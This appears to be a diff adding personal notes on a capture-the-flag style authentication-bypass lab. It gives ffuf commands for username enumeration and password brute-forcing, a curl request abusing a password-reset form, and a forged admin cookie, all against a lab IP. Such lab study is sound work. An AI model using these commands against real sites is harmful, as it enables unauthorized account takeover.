@@ -1,0 +1,60 @@
+this room should be named FFUF
+____________________
+Authentication bypass
+
+definition:
+  any attack that allows a user to 
+  reach functionality restricted to a given account
+  without supplying the correct credential for that account
+
+this room is very low-quality, I recommend to skip.
+They told us that brute-forcing is an authentication bypass method (it's not) and many more
+____________________
+ffuf
+
+-- enumerating with ffuf --
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.141.165/customers/signup -mr "username already exists"
+-w = wordlist
+-X = HTTP method
+-d = request body (FUZZ is a placeholder for the wordlist)
+-H = header (without this, the request will fail)
+-u = URL
+-mr = match regex (we want to match the response that says "username already exists")
+*** this ffuf will give you a wall of requests, unreadable
+for slightly better readability, at least pipe grep so you have green markers
+grep -iF "Status: 200"
+
+
+is it all about ffuf? yes
+are we brute-forcing a form using ffuf? yes
+
+--brute-force with ffuf--
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.141.165/customers/login -fc 200
+
+the interesting part are the 2 wordlists
+-w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2
+
+____________________
+curl
+
+curl 'http://10.112.141.165/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+url-encoded email address
+-H = header (sets Content-Type so it's treated as url-encoded form data)
+-d = request body (username=robert)
+
+____________________
+cookie manipulation
+this was a very easy bypass, but fun
+
+this one says not logged in
+curl http://10.112.141.165/cookie-test
+
+this one says logged in as admin
+curl -H "Cookie: logged_in=true; admin=true" http://10.112.141.165/cookie-test
+
+____________________
+hashing and encoding
+cracking a hash and encoding some values...
+I use:
+crackstation to crack hashes
+cyberchef to encode/decode values
